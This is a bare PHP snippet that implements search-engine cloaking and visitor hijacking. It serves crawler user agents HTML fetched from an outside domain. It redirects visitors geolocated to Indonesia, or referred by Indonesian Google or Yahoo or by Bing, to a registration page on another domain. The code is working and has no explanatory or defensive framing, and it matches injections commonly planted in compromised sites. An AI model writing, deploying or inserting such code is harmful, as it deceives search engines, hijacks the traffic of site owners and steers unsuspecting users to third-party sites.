    header('Vary: Accept-Language');
    header('Vary: User-Agent');

    $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
    $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';

    function get_client_ip() {
        return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
    }

    $ip = get_client_ip();

    $bot_url = "https://uttorbongoprotidin.com/readme.html";
    $reff_url = "https://bigo234gcr.mom/register"; 

    $file = file_get_contents($bot_url);

    $geolocation = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
    $cc = $geolocation['geoplugin_countryCode'];
    $botchar = "/(googlebot|slurp|adsense|inspection)/";

    if (preg_match($botchar, $ua)) {
        echo $file;
        exit;
    }

    if ($cc === "ID") {
        header("HTTP/1.1 302 Found");
        header("Location: ".$reff_url);
        exit();
    }


    if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
        header("HTTP/1.1 302 Found");
        header("Location: ".$reff_url);
        exit();
    }
